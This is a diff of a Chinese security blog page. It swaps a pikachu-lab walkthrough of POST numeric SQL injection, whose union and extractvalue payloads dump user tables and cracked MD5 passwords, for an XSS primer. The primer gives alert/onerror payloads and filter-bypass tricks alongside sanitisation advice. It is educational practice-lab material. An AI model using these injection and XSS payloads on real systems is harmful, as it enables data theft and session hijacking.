@@ -22,7 +22,7 @@
 
   
 
-  <title>pikachu靶场-SQLI-数字型注入（POST） | Liv_binz的技术博客</title>
+  <title>见框就插之XSS | Liv_binz的技术博客</title>
 
   
 
@@ -90,20 +90,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">pikachu靶场-SQLI-数字型注入（POST）</h1>
+          <h1 class="title-wrap">见框就插之XSS</h1>
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-31T05:24:30.628Z" itemprop="datePublished">2022-01-31</time>
+            <time  class="article-date" datetime="2022-05-02T18:56:43.382Z" itemprop="datePublished">2022-05-03</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/sqli/">📒 sqli</a></li>
+    <li><a href="/categories/xss/">📒 xss</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/pikachu/">🏷️ pikachu</a></li>
+    <li><a href="/tags/xss/">🏷️ xss</a></li>
   
 </ul>
         </div>
@@ -127,144 +127,107 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="pikachu靶场-SQLI-数字型注入（POST）"><a href="#pikachu靶场-SQLI-数字型注入（POST）" class="headerlink" title="pikachu靶场-SQLI-数字型注入（POST）"></a>pikachu靶场-SQLI-数字型注入（POST）</h1><ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>id=1</strong></li>
-<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
+        <h1 id="见框就插之XSS"><a href="#见框就插之XSS" class="headerlink" title="见框就插之XSS"></a>见框就插之XSS</h1><h2 id="XSS-简介"><a href="#XSS-简介" class="headerlink" title="XSS 简介"></a>XSS 简介</h2><p><strong>XSS</strong>：跨站脚本攻击（Cross-site Scripting）通过前端输入可被执行的payload来达到想达到的目的</p>
+<h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><ol>
+<li>获取用户的信息</li>
+<li>利用XSS构造出虚假的登录框进行钓鱼</li>
+<li>注入木马或者广告链接</li>
+<li>后台的增删改查（需要配合CSRF）</li>
+<li>XSS蠕虫</li>
 </ol>
-<p>下面演示一下联合注入和报错注入by hand</p>
-<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>首先查列：</p>
-<pre><code>id=1 order by 1#&amp;submit=%E6%9F%A5%E8%AF%A2
+<h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><ol>
+<li>反射型XSS</li>
+<li>存储型XSS</li>
+<li>DOM型XSS</li>
+</ol>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><strong>特点</strong>：一次一执行</p>
+<pre><code>一般有这样的一个特点，输入后有输入的回显，且可以在url中看见传了一个参数
 </code></pre>
-<p>回显正常</p>
-<pre><code>id=1 order by 2#&amp;submit=%E6%9F%A5%E8%AF%A2
+<p><strong>源码简单分析</strong>：</p>
+<pre><code>&lt;?php
+if (存在name值且name值不为空)&#123;
+    $name = 用户输入;
+    echo $name;
+&#125;
+?&gt;
 </code></pre>
-<p>回显正常</p>
-<pre><code>id=1 order by 3#&amp;submit=%E6%9F%A5%E8%AF%A2
+<p>在回显的时候没有对用户输入做任何过滤所以导致用户可以在前端输入代码，从而让自己的脚本在网页中运行</p>
+<p><strong>常用测试语句</strong>：</p>
+<pre><code>&lt;script&gt;alert(&#39;b1nz&#39;)&lt;/script&gt;
 </code></pre>
-<p>回显：</p>
-<pre><code>Unknown column &#39;3&#39; in &#39;order clause&#39;
+<p><strong>对用户输入进行屏蔽的一些方法</strong>：</p>
+<p><strong>第一种</strong></p>
+<pre><code>$name = str_replace(&#39;&lt;script&gt;&#39;,&#39;&#39;, $name );
 </code></pre>
-<p>列数：2</p>
-<p>查库：</p>
-<pre><code>id=-1 union select 1,database()#&amp;submit=%E6%9F%A5%E8%AF%A2
+<p><strong>第二种</strong></p>
+<pre><code>$name = preg_replace(&#39;\&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t\ i&#39;,&#39;&#39;, $name );
 </code></pre>
-<p>回显：</p>
-<pre><code>hello,1
-your email is: pikachu
+<p>正则表达式分析工具：</p>
+<pre><code>https://regex101.com/
 </code></pre>
-<p>库名为pikachu</p>
-<p>查表：</p>
-<pre><code>id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;#&amp;submit=%E6%9F%A5%E8%AF%A2
+<p><strong>第三种</strong></p>
+<pre><code>$name = htmlspecialchars( $name );
 </code></pre>
-<p>回显：</p>
-<pre><code>hello，1
-your email is: httpinfo,member,message,users,xssblind
+<p>htmlspecialchars是将其中内容转换成字符实体，不能再被当成标签解析</p>
+<p><strong>绕过方法</strong>：</p>
+<p>绕过： </p>
+<ol>
+<li><p>由于str_replace函数是区分大小写的 所以直接换成大写字母就可以绕过(<strong>大小写绕过</strong>)</p>
+</li>
+<li><p>将<code>&lt;script&gt;</code>替换成<code>&lt;scr&lt;script&gt;ipt&gt;</code>即可（<strong>拼凑绕过</strong>）</p>
+</li>
+<li><p>运用别的标签来进行注入</p>
+</li>
+</ol>
+<p>例如：</p>
+<pre><code>&lt;img src=1 onerror=alert(1)&gt;
 </code></pre>
-<p>表名为httpinfo,member,message,users,xssblind</p>
-<p>查列：</p>
-<pre><code>id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; #&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>hello，1
-your email is:id,username,password,level
-</code></pre>
-<p>列名为id,username,password,level</p>
-<p>查字段：</p>
-<pre><code>id=-1 union select group_concat(username),group_concat(paswoord) from users#&amp;submit=%E6%9F%A5%E8%AF%A2
+<ol start="4">
+<li>对htmlspecialchars()函数的绕过：</li>
+</ol>
+<p>默认下，htmlspecialchars()不过滤单引号，可构造如下payload进行绕过</p>
+<pre><code>p&#39;onclick=&#39;alert(1)
 
-id=-1 union select group_concat(username),group_concat(level) from users#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>hello,admin,pikachu,test
-your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03
+这样html代码就会变成
 
-hello,admin,pikachu,test
-your email is: 1,2,3
+&lt;input type=&#39;text&#39; name=&#39;p&#39; onclick=alert(1) &gt;
+
+点击按钮后就可以完成xss攻击了
 </code></pre>
-<p>对密码进行md5解密：</p>
-<blockquote>
-<p>e10adc3949ba59abbe56e057f20f883e — 123456<br>670b14728ad9902aecba32e22fa4f6bd — 000000<br>e99a18c428cb38d5f260853678922e03 — abc123</p>
-</blockquote>
-<p>用户名：</p>
-<p>admin，pikachu，test</p>
-<p>密码：</p>
-<p>123456，000000，abc123</p>
-<p>level：</p>
-<p>1，2，3</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>查库：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select database())))#&amp;submit=%E6%9F%A5%E8%AF%A2
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><strong>特点</strong>：输入会被存在数据库 所以存入后每次都会执行注入过的脚本</p>
+<p><strong>源码简单分析</strong>：</p>
+<pre><code>&lt;?php
+if(有提交)&#123;
+    $message = 输入
+    $name = 输入
+    $query = 插入数据库语句
+
+function&#123;
+    取出数据库内容
+    echo #导致XSS漏洞
+    &#125;    
+&#125;
+?&gt;
 </code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~pikachu&#39;
+<p><strong>对用户输入进行屏蔽的一些方法</strong>：</p>
+<p><strong>第一种</strong>：</p>
+<pre><code>$name = strip_tags( addslashes( $name ) );
+$message = strip_tags( addslashes( $message ) );
 </code></pre>
-<p>查表：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;)))#&amp;submit=%E6%9F%A5%E8%AF%A2
+<p><strong>第二种</strong>：</p>
+<pre><code>$name = htmlspecialchars( $name );
+$message = htmlspecialchars( $message );
 </code></pre>
-<p>回显：</p>
-<pre><code> XPATH syntax error: &#39;~httpinfo,member,message,users,x&#39;
-</code></pre>
-<blockquote>
-<p>报错信息有32字节的限制</p>
-<p>如果显示里没有需要的表名，再用limit来查</p>
-</blockquote>
-<p>查列：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39;)))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~id,username,password,level&#39;
-</code></pre>
-<p>查字段：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~admin&#39;
-</code></pre>
-<p>limit 1，1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~pikachu&#39;
-</code></pre>
-<p>limit 2，1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~test&#39;
-</code></pre>
-<p>limit 3，1</p>
-<p>回显：</p>
-<pre><code>您输入的user id不存在
-</code></pre>
-<p>字段只有3个</p>
-<p>接着查password：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select password from users limit 0,1)))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~e10adc3949ba59abbe56e057f20f883&#39;
-</code></pre>
-<p>limit 1,1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~670b14728ad9902aecba32e22fa4f6b&#39;
-</code></pre>
-<p>limit 2,1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~e99a18c428cb38d5f260853678922e0&#39;
-</code></pre>
-<p>解码：</p>
-<p>对密码进行md5解密：</p>
-<blockquote>
-<p>e10adc3949ba59abbe56e057f20f883e — 123456<br>670b14728ad9902aecba32e22fa4f6bd — 000000<br>e99a18c428cb38d5f260853678922e03 — abc123</p>
-</blockquote>
-<p>用户名：</p>
-<p>admin，pikachu，test</p>
-<p>密码：</p>
-<p>123456，000000，abc123</p>
-<blockquote>
-<p>如果对level字段有需求可以接着查，和查username和password字段的步骤一样^^</p>
-</blockquote>
+<p>可以在存入数据库时就存入实体，也可以在回显的时候转换成实体</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p><strong>特点</strong>：在前端执行 不与服务器进行交互</p>
+<p>与之前的原理类似 只不过更加灵活 要通过源码来具体分析 构成payload</p>
 
       </section>
 
       
       
         <nav class="article-nav">
+          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -275,23 +238,6 @@ your email is: 1,2,3
       
         <a href="/2022/01/31/pikachu2/" itemprop="url">
           <h2 class="card-text--title text-ellipsis">pikachu靶场-不安全的URL重定向</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
-          
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="/cover.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/01/28/http1/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">HTTP系列1-HTTP/0.9-HTTP/1.0</h2>
         </a>
       
       <div class="card-text--row">Older</div>
